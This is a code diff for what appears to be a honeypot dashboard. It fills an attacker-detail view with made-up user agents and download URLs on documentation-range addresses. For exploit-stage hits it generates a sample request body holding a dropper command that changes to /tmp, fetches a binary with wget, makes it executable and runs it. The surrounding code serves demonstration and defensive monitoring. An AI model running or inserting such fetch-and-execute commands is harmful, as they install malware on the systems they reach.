@@ -10,12 +10,24 @@ function fromEvents(actor: Actor, events: AttackEvent[]): ActorDetailData {
   const mine = events.filter((e) => ips.has(e.source_ip));
   const counts = new Map<string, number>();
   for (const e of mine) if (e.path) counts.set(e.path, (counts.get(e.path) ?? 0) + 1);
+  // Demo payloads point at RFC 5737 documentation addresses, never a real host.
+  const n = actor.id.length + actor.hit_count;
+  const loader = `http://203.0.113.${(n % 200) + 20}/bins/x86_64`;
+  const ua = actor.tags?.includes('scanner')
+    ? 'Mozilla/5.0 zgrab/0.x'
+    : ['Go-http-client/1.1', 'Mozilla/5.0 (X11; Linux x86_64) Hello World', 'python-requests/2.31.0'][n % 3];
+  const hasExploit = mine.some((e) => e.stage === 'exploit');
   return {
     ...actor,
-    user_agents: [],
-    download_urls: [],
+    user_agents: [ua],
+    download_urls: hasExploit ? [loader] : [],
     paths: [...counts].sort((a, b) => b[1] - a[1]).slice(0, 15).map(([path, count]) => ({ path, count })),
-    hits: mine.slice(0, 200).map((e) => ({ ...e, body_preview: null, user_agent: null })),
+    hits: mine.slice(0, 200).map((e) => ({
+      ...e,
+      user_agent: ua,
+      body_preview:
+        e.stage === 'exploit' ? `cmd=cd /tmp || cd /var/run; wget ${loader}; chmod +x x86_64; ./x86_64 ${actor.label.toLowerCase()}` : null,
+    })),
   };
 }
 
